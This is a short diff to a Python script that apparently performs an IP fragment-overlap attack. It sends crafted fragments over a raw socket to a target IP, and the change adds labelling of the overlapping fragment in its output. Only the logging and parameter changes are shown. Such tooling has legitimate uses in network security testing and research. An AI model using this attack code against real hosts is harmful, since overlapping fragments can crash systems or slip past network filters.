@@ -91,11 +91,11 @@ def simpleOverlapAttackParam(srcIP, dstIP):
         })
 
     # Return all needed parameters as a class for easy access later in main attacker code:
-    return attackParamClass(srcIP,dstIP,IDField,TTL,protoField,fragSize,allFragms)
+    return attackParamClass(srcIP,dstIP,IDField,TTL,protoField,fragSize,allFragms),overlapInd
 
 
-def simpleOverlapAttack(attackParams):
-    rawSock=rawSockGen();
+def simpleOverlapAttack(attackParams,overlapInd):
+    rawSock=rawSockGen()
 
     for i in range(len(attackParams.allFragms)): #For each fragment, build the IP header add the pre-built payload and send it to the target destination address
         frag=attackParams.allFragms[i]
@@ -109,6 +109,10 @@ def simpleOverlapAttack(attackParams):
 
         ipPacket=ipHeadPacket + frag["fragPayload"]
         rawSock.sendto(ipPacket, (attackParams.destIPAddr,0))
-        print(f"[Frag {i+1}] size={frag['fragSize']}, offset={frag['fragOffset']}, MF={0 if isLastFrag else 1}")
 
-    print(f"=> Fragments sent with ID={attackParams.IDField}. Attack Completed!") 
+        if (i==overlapInd):
+            print(f"[Frag {i+1}] size={frag['fragSize']}, offset={frag['fragOffset']}, MF={0 if isLastFrag else 1} ---> Overlapping Fragment")
+        else:
+            print(f"[Frag {i+1}] size={frag['fragSize']}, offset={frag['fragOffset']}, MF={0 if isLastFrag else 1}")
+
+    print(f"\n=> Fragments sent with ID={attackParams.IDField}. Attack Completed!") 
